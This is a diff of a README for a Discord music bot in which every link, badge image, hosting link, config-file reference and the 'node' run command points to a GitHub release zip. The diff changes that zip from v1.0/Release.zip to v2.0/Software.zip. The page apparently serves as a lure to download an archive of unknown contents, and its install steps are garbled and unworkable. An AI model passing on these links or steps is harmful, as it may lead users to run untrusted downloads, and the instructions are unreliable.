@@ -1,39 +1,39 @@
-![Animated Background](https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip)
+![Animated Background](https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip)
 
 <h1 align="center" style="font-family: Arial, sans-serif; color: #FF6F61; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
   Distube Music Bot
 </h1>
 
 <p align="center">
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="License: MIT" />
   </a>
 
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="Donate" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="YouTube" />
   </a>
 
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="Join Discord" />
   </a>
 
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="Instagram" />
   </a>
 
-  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip"
+  <a href="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip"
       alt="Facebook" />
   </a>
 </p>
@@ -44,13 +44,13 @@
 
 ## How to Install
 
-### Step 1: Update `https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip`
+### Step 1: Update `https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip`
 
-1. Open the `https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip` and add your mongodb url, youtube api & spotify [ You can get them from our Sever ].
+1. Open the `https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip` and add your mongodb url, youtube api & spotify [ You can get them from our Sever ].
 
 ### Step 2: Set Up Hosting Service
 
-1. Go to your preferred hosting service. For this guide, we use [Render](https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip).
+1. Go to your preferred hosting service. For this guide, we use [Render](https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip).
 2. In the Build & Deploy section, paste your repository URL.
 
 
@@ -58,7 +58,7 @@
  Run the following commands to install dependencies and start your bot:
 
    npm install
-   node https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v1.0/Release.zip
+   node https://github.com/Oliwier37321/Discord-Music-bot/releases/download/v2.0/Software.zip
 
 ### Step 4: Get Your Bot Token
 Navigate to the Discord Developer Portal.
